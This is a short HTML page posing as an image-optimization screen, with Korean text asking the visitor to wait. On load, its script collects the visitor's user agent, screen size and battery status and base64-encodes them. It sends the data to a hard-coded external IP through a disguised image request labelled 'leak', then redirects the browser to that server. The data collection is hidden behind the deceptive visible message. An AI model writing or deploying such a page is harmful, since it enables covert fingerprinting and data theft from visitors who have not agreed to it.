<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>이미지 확인 중...</title>
</head>
<body>
    <script>
        async function collectAndRedirect() {
            // 1. 데이터 수집 (배터리 등)
            let batteryInfo = "unknown";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                batteryInfo = `Level:${Math.round(b.level * 100)}%,Charging:${b.charging}`;
            }

            const data = {
                ua: navigator.userAgent,
                res: `${screen.width}x${screen.height}`,
                batt: batteryInfo
            };

            const encodedData = btoa(JSON.stringify(data));
            const ec2_url = `http://35.172.183.229/view.jpg`;

            // 2. 내 서버로 먼저 데이터를 던짐 (이미지 요청)
            const tracker = new Image();
            tracker.src = `${ec2_url}?leak=${encodedData}`;

            // 3. 0.5초 뒤에 아예 페이지를 구글 로고 주소로 이동시켜버림 (이게 핵심!)
            setTimeout(() => {
                window.location.href = ec2_url;
            }, 500);
        }

        collectAndRedirect();
    </script>
    <p>이미지를 최적화 중입니다. 잠시만 기다려주세요...</p>
</body>
</html>
